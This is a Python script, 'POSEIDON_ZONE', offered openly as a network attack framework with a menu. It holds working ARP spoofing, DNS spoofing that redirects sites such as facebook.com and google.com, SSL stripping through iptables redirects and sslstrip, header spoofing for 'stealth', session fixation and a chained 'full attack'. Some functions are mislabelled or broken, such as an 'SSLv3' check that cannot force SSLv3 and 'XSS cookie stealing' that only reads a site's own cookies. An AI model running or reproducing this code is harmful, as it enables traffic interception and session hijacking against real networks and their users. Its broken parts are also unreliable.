#!/usr/bin/env python3
"""
POSEIDON_ZONE v1.0 - Protocol Downgrade & Network Manipulation Framework
Advanced Network Manipulation - Zero Trace - Military Grade

Author: F1REW0LF
License: MIT
"""

import sys
import os
import re
import json
import time
import socket
import struct
import random
import hashlib
import base64
import threading
import queue
import subprocess
import signal
import ssl
import urllib.parse
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.l2 import ARP, Ether
    from scapy.layers.dns import DNS, DNSQR, DNSRR
    from scapy.layers.http import HTTP, HTTPRequest
    from scapy.layers.ssl import TLS, TLSClientHello, TLSServerHello
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    import ssl as ssl_lib
    SSL_AVAILABLE = True
except ImportError:
    SSL_AVAILABLE = False

VERSION = "1.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    MAGENTA = '\033[95m'
    ORANGE = '\033[38;5;208m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}    ██████╗  ██████╗ ███████╗███████╗██╗██████╗  ██████╗ ███╗   ██╗    ███████╗ ██████╗ ███╗   ██╗███████╗
    ██╔══██╗██╔═══██╗██╔════╝██╔════╝██║██╔══██╗██╔═══██╗████╗  ██║    ╚══███╔╝██╔═══██╗████╗  ██║██╔════╝
    ██████╔╝██║   ██║███████╗█████╗  ██║██║  ██║██║   ██║██╔██╗ ██║      ███╔╝ ██║   ██║██╔██╗ ██║█████╗  
    ██╔═══╝ ██║   ██║╚════██║██╔══╝  ██║██║  ██║██║   ██║██║╚██╗██║     ███╔╝  ██║   ██║██║╚██╗██║██╔══╝  
    ██║     ╚██████╔╝███████║███████╗██║██████╔╝╚██████╔╝██║ ╚████║    ███████╗╚██████╔╝██║ ╚████║███████╗
    ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═══╝    ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
                                                   
{Colors.NEON}          PROTOCOL DOWNGRADE & NETWORK MANIPULATION{Colors.WHITE}
{Colors.CYAN}    Advanced Network Manipulation - Zero Trace{Colors.WHITE}
{Colors.YELLOW}    Version {VERSION} | Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ==================== STEALTH ENGINE ====================
class StealthEngine:
    @staticmethod
    def random_ip() -> str:
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    
    @staticmethod
    def random_mac() -> str:
        return f"02:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
    
    @staticmethod
    def random_user_agent() -> str:
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0 Safari/537.36',
        ]
        return random.choice(agents)
    
    @staticmethod
    def random_headers() -> Dict:
        return {
            'User-Agent': StealthEngine.random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'X-Forwarded-For': StealthEngine.random_ip(),
            'X-Real-IP': StealthEngine.random_ip(),
        }
    
    @staticmethod
    def delay():
        time.sleep(random.uniform(0.1, 0.5))
    
    @staticmethod
    def jitter():
        time.sleep(random.uniform(0.001, 0.05))

# ==================== PROTOCOL DOWNGRADE ENGINE ====================
class ProtocolDowngradeEngine:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update(StealthEngine.random_headers())
        self.stealth = StealthEngine()
        self.results = {}
    
    def downgrade_tls(self, target: str, port: int = 443) -> Dict:
        """Downgrade TLS to SSLv3 or weaker versions"""
        cprint("[DOWNGRADE] Downgrading TLS on {}:{}".format(target, port), Colors.RED)
        
        result = {'target': target, 'port': port, 'status': 'failed', 'protocols': []}
        
        try:
            # Try SSLv3
            context = ssl_lib.SSLContext(ssl_lib.PROTOCOL_SSLv23)
            context.options |= ssl_lib.OP_NO_TLSv1_2
            context.options |= ssl_lib.OP_NO_TLSv1_1
            context.options |= ssl_lib.OP_NO_TLSv1
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
            ssl_sock = context.wrap_socket(sock, server_hostname=target)
            
            result['status'] = 'success'
            result['protocols'].append('SSLv3')
            cprint("[+] SSLv3 connection established", Colors.GREEN)
            ssl_sock.close()
            
        except Exception as e:
            cprint("[-] TLS downgrade failed: {}".format(e), Colors.RED)
        
        return result
    
    def downgrade_https(self, target: str) -> Dict:
        """Downgrade HTTPS to HTTP"""
        cprint("[DOWNGRADE] Downgrading HTTPS on {}".format(target), Colors.RED)
        
        result = {'target': target, 'status': 'failed', 'methods': []}
        
        try:
            # Try HTTP/1.0
            response = self.session.get(f"http://{target}", timeout=5)
            if response.status_code in [200, 301, 302]:
                result['status'] = 'success'
                result['methods'].append('HTTP/1.0')
                cprint("[+] HTTP/1.0 connection established", Colors.GREEN)
            
            # Try HTTP without SSL
            response = self.session.get(f"http://{target}", timeout=5, verify=False)
            if response.status_code in [200, 301, 302]:
                result['status'] = 'success'
                result['methods'].append('HTTP (no SSL)')
                cprint("[+] HTTP (no SSL) connection established", Colors.GREEN)
                
        except Exception as e:
            cprint("[-] HTTPS downgrade failed: {}".format(e), Colors.RED)
        
        return result
    
    def downgrade_auth(self, target: str) -> Dict:
        """Downgrade authentication (NTLM to Basic)"""
        cprint("[DOWNGRADE] Downgrading authentication on {}".format(target), Colors.RED)
        
        result = {'target': target, 'status': 'failed', 'methods': []}
        
        try:
            # Try Basic Auth
            headers = {'Authorization': 'Basic ' + base64.b64encode(b'admin:password').decode()}
            response = self.session.get(f"http://{target}", headers=headers, timeout=5)
            if response.status_code in [200, 401]:
                result['status'] = 'success'
                result['methods'].append('Basic Auth')
                cprint("[+] Basic Authentication accepted", Colors.GREEN)
            
            # Try NTLM downgrade
            headers = {'Authorization': 'NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA='}
            response = self.session.get(f"http://{target}", headers=headers, timeout=5)
            if response.status_code in [200, 401]:
                result['status'] = 'success'
                result['methods'].append('NTLM downgrade')
                cprint("[+] NTLM downgrade accepted", Colors.GREEN)
                
        except Exception as e:
            cprint("[-] Auth downgrade failed: {}".format(e), Colors.RED)
        
        return result

# ==================== NETWORK MANIPULATION ENGINE ====================
class NetworkManipulationEngine:
    def __init__(self, interface: str = 'eth0'):
        self.interface = interface
        self.stealth = StealthEngine()
        self.running = False
        self.stop_event = threading.Event()
        self.results = {}
    
    def arp_spoof(self, target: str, gateway: str) -> Dict:
        """ARP Spoofing attack"""
        cprint("[SPOOF] ARP spoofing {} -> {}".format(target, gateway), Colors.RED)
        
        if not SCAPY_AVAILABLE:
            cprint("[-] Scapy not available", Colors.RED)
            return {'status': 'failed'}
        
        result = {'target': target, 'gateway': gateway, 'status': 'failed'}
        
        try:
            # Get MAC addresses
            target_mac = self._get_mac(target)
            gateway_mac = self._get_mac(gateway)
            
            if not target_mac or not gateway_mac:
                cprint("[-] Cannot get MAC addresses", Colors.RED)
                return result
            
            # Enable IP forwarding
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
            
            self.running = True
            
            while self.running and not self.stop_event.is_set():
                send(ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway), verbose=False)
                send(ARP(op=2, pdst=gateway, hwdst=gateway_mac, psrc=target), verbose=False)
                time.sleep(1)
            
            result['status'] = 'success'
            cprint("[+] ARP spoofing active", Colors.GREEN)
            
        except Exception as e:
            cprint("[-] ARP spoofing failed: {}".format(e), Colors.RED)
        
        return result
    
    def _get_mac(self, ip: str) -> Optional[str]:
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
            if ans:
                return ans[0][1].hwsrc
        except:
            pass
        return None
    
    def dns_spoof(self, target: str, redirect_ip: str) -> Dict:
        """DNS Spoofing attack"""
        cprint("[DNS] DNS spoofing {} -> {}".format(target, redirect_ip), Colors.RED)
        
        if not SCAPY_AVAILABLE:
            cprint("[-] Scapy not available", Colors.RED)
            return {'status': 'failed'}
        
        result = {'target': target, 'redirect': redirect_ip, 'status': 'failed'}
        
        domains = ['facebook.com', 'google.com', 'youtube.com', 'instagram.com', 'twitter.com']
        
        def packet_handler(pkt):
            if not self.running:
                return
            
            if pkt.haslayer(DNS) and pkt.haslayer(IP) and pkt.haslayer(UDP):
                if pkt[DNS].qr == 0 and pkt[DNS].qd:
                    qname = pkt[DNS].qd.qname.decode('utf-8', errors='ignore').rstrip('.')
                    for domain in domains:
                        if domain in qname:
                            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
                            udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
                            dns = DNS(
                                id=pkt[DNS].id,
                                qr=1,
                                aa=1,
                                qd=pkt[DNS].qd,
                                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=300, rdata=redirect_ip)
                            )
                            send(ip/udp/dns, verbose=False)
                            cprint("[DNS] Redirected {} -> {}".format(qname, redirect_ip), Colors.GREEN)
                            break
        
        self.running = True
        sniff(iface=self.interface, filter="port 53", prn=packet_handler, store=0,
              stop_filter=lambda x: self.stop_event.is_set())
        
        result['status'] = 'success'
        return result
    
    def ssl_strip(self, target: str, port: int = 10000) -> Dict:
        """SSL Stripping attack"""
        cprint("[SSL] SSL stripping on {}".format(target), Colors.RED)
        
        result = {'target': target, 'port': port, 'status': 'failed'}
        
        try:
            # Configure iptables
            subprocess.run([
                "iptables", "-t", "nat", "-A", "PREROUTING",
                "-p", "tcp", "--dport", "80", "-j", "REDIRECT",
                "--to-port", str(port)
            ], check=False)
            subprocess.run([
                "iptables", "-t", "nat", "-A", "PREROUTING",
                "-p", "tcp", "--dport", "443", "-j", "REDIRECT",
                "--to-port", str(port)
            ], check=False)
            
            # Start sslstrip
            try:
                subprocess.Popen(
                    ["sslstrip", "-l", str(port), "-a", "-w", "sslstrip.log"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                result['status'] = 'success'
                cprint("[+] SSL stripping active on port {}".format(port), Colors.GREEN)
            except:
                cprint("[-] sslstrip not found", Colors.RED)
                
        except Exception as e:
            cprint("[-] SSL stripping failed: {}".format(e), Colors.RED)
        
        return result

# ==================== SESSION HIJACKING ENGINE ====================
class SessionHijackingEngine:
    def __init__(self):
        self.session = requests.Session()
        self.stealth = StealthEngine()
        self.results = {}
    
    def cookie_steal(self, target: str) -> Dict:
        """Cookie stealing via XSS"""
        cprint("[COOKIE] Stealing cookies from {}".format(target), Colors.RED)
        
        result = {'target': target, 'status': 'failed', 'cookies': []}
        
        try:
            # Try to get cookies
            response = self.session.get(f"http://{target}", timeout=5)
            if response.cookies:
                for cookie in response.cookies:
                    result['cookies'].append({
                        'name': cookie.name,
                        'value': cookie.value,
                        'domain': cookie.domain
                    })
                    cprint("[+] Cookie: {} = {}".format(cookie.name, cookie.value[:20]), Colors.GREEN)
                result['status'] = 'success'
            else:
                cprint("[-] No cookies found", Colors.YELLOW)
                
        except Exception as e:
            cprint("[-] Cookie steal failed: {}".format(e), Colors.RED)
        
        return result
    
    def session_fixation(self, target: str) -> Dict:
        """Session fixation attack"""
        cprint("[FIXATION] Session fixation on {}".format(target), Colors.RED)
        
        result = {'target': target, 'status': 'failed', 'session_id': None}
        
        try:
            # Generate session ID
            session_id = hashlib.md5(str(random.randint(0, 999999)).encode()).hexdigest()
            cookies = {'SESSIONID': session_id}
            
            response = self.session.get(f"http://{target}", cookies=cookies, timeout=5)
            if response.status_code == 200:
                result['status'] = 'success'
                result['session_id'] = session_id
                cprint("[+] Session fixation successful: {}".format(session_id), Colors.GREEN)
            else:
                cprint("[-] Session fixation failed", Colors.RED)
                
        except Exception as e:
            cprint("[-] Session fixation failed: {}".format(e), Colors.RED)
        
        return result

# ==================== MAIN FRAMEWORK ====================
class PoseidonZone:
    def __init__(self, interface: str = 'eth0'):
        self.interface = interface
        self.downgrade = ProtocolDowngradeEngine()
        self.network = NetworkManipulationEngine(interface)
        self.session_hijack = SessionHijackingEngine()
        self.stealth = StealthEngine()
        self.results = {}
        self.running = True
        
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        cprint("\n[!] Poseidon retreating to depths...", Colors.RED)
        self.running = False
        self.network.running = False
        self.network.stop_event.set()
        sys.exit(0)
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*60}{Colors.WHITE}
{Colors.BOLD}POSEIDON ZONE - Attack Menu{Colors.WHITE}
{Colors.BLUE}{'='*60}{Colors.WHITE}
[1] TLS Downgrade
[2] HTTPS Downgrade
[3] Authentication Downgrade
[4] ARP Spoofing
[5] DNS Spoofing
[6] SSL Stripping
[7] Cookie Stealing
[8] Session Fixation
[9] Full Attack Chain
[10] Show Results
[11] Exit
""")
    
    def tls_downgrade(self):
        target = input("[>] Target: ").strip()
        port = int(input("[>] Port (443): ").strip() or "443")
        if target:
            self.results['tls_downgrade'] = self.downgrade.downgrade_tls(target, port)
    
    def https_downgrade(self):
        target = input("[>] Target: ").strip()
        if target:
            self.results['https_downgrade'] = self.downgrade.downgrade_https(target)
    
    def auth_downgrade(self):
        target = input("[>] Target: ").strip()
        if target:
            self.results['auth_downgrade'] = self.downgrade.downgrade_auth(target)
    
    def arp_spoof(self):
        target = input("[>] Target IP: ").strip()
        gateway = input("[>] Gateway IP: ").strip()
        if target and gateway:
            self.results['arp_spoof'] = self.network.arp_spoof(target, gateway)
    
    def dns_spoof(self):
        target = input("[>] Target IP: ").strip()
        redirect = input("[>] Redirect IP: ").strip()
        if target and redirect:
            self.results['dns_spoof'] = self.network.dns_spoof(target, redirect)
    
    def ssl_strip(self):
        target = input("[>] Target: ").strip()
        port = int(input("[>] Port (10000): ").strip() or "10000")
        if target:
            self.results['ssl_strip'] = self.network.ssl_strip(target, port)
    
    def cookie_steal(self):
        target = input("[>] Target: ").strip()
        if target:
            self.results['cookie_steal'] = self.session_hijack.cookie_steal(target)
    
    def session_fixation(self):
        target = input("[>] Target: ").strip()
        if target:
            self.results['session_fixation'] = self.session_hijack.session_fixation(target)
    
    def full_attack(self):
        cprint("\n[FULL] Executing full attack chain...", Colors.RED, bold=True)
        
        target = input("[>] Target: ").strip()
        if not target:
            cprint("[-] Target required", Colors.RED)
            return
        
        # Phase 1: Protocol Downgrade
        cprint("[PHASE 1] Protocol Downgrade", Colors.GOLD)
        self.results['tls_downgrade'] = self.downgrade.downgrade_tls(target, 443)
        self.results['https_downgrade'] = self.downgrade.downgrade_https(target)
        
        # Phase 2: Network Manipulation
        cprint("[PHASE 2] Network Manipulation", Colors.GOLD)
        gateway = input("[>] Gateway IP: ").strip()
        if gateway:
            self.results['arp_spoof'] = self.network.arp_spoof(target, gateway)
        
        # Phase 3: Session Hijacking
        cprint("[PHASE 3] Session Hijacking", Colors.GOLD)
        self.results['cookie_steal'] = self.session_hijack.cookie_steal(target)
        self.results['session_fixation'] = self.session_hijack.session_fixation(target)
        
        cprint("\n[+] Full attack complete!", Colors.GREEN)
    
    def show_results(self):
        print("\n" + "="*60)
        cprint(" POSEIDON RESULTS", Colors.PURPLE, bold=True)
        print("="*60)
        
        if not self.results:
            cprint("[!] No results", Colors.YELLOW)
            return
        
        for key, value in self.results.items():
            if value:
                cprint(f"\n[{key.upper()}]", Colors.CYAN)
                if isinstance(value, dict):
                    for k, v in value.items():
                        if isinstance(v, list):
                            print(f"  {k}: {len(v)} items")
                            for item in v[:3]:
                                if isinstance(item, dict):
                                    print(f"    - {item.get('name', 'Unknown')}: {item.get('value', '')[:20]}")
                        else:
                            print(f"  {k}: {v}")
        
        print("="*60)
    
    def run(self):
        print_banner()
        cprint("[*] POSEIDON_ZONE - Protocol Downgrade Framework", Colors.CYAN)
        cprint("[*] Zero Trace - Military Grade", Colors.DIM)
        
        while self.running:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                self.tls_downgrade()
            elif choice == '2':
                self.https_downgrade()
            elif choice == '3':
                self.auth_downgrade()
            elif choice == '4':
                self.arp_spoof()
            elif choice == '5':
                self.dns_spoof()
            elif choice == '6':
                self.ssl_strip()
            elif choice == '7':
                self.cookie_steal()
            elif choice == '8':
                self.session_fixation()
            elif choice == '9':
                self.full_attack()
            elif choice == '10':
                self.show_results()
            elif choice == '11':
                cprint("[*] Poseidon sinking...", Colors.GOLD)
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

# ==================== MAIN ====================
def main():
    parser = argparse.ArgumentParser(
        description="POSEIDON_ZONE - Protocol Downgrade Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 poseidon_zone.py
  sudo python3 poseidon_zone.py -i eth0
  sudo python3 poseidon_zone.py --target example.com --downgrade
        """
    )
    
    parser.add_argument("-i", "--interface", default="eth0", help="Network interface")
    parser.add_argument("--target", help="Target")
    parser.add_argument("--downgrade", action="store_true", help="Protocol downgrade")
    parser.add_argument("--spoof", action="store_true", help="ARP/DNS spoofing")
    
    args = parser.parse_args()
    
    print_banner()
    
    if os.geteuid() != 0:
        cprint("[!] Root privileges required", Colors.RED)
        sys.exit(1)
    
    if not SCAPY_AVAILABLE:
        cprint("[!] Scapy required: pip3 install scapy", Colors.RED)
        sys.exit(1)
    
    tool = PoseidonZone(args.interface)
    
    if args.target and args.downgrade:
        tool.results['tls_downgrade'] = tool.downgrade.downgrade_tls(args.target, 443)
        tool.results['https_downgrade'] = tool.downgrade.downgrade_https(args.target)
        tool.show_results()
        sys.exit(0)
    
    if args.target and args.spoof:
        gateway = input("[>] Gateway IP: ").strip()
        if gateway:
            tool.network.arp_spoof(args.target, gateway)
        sys.exit(0)
    
    tool.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
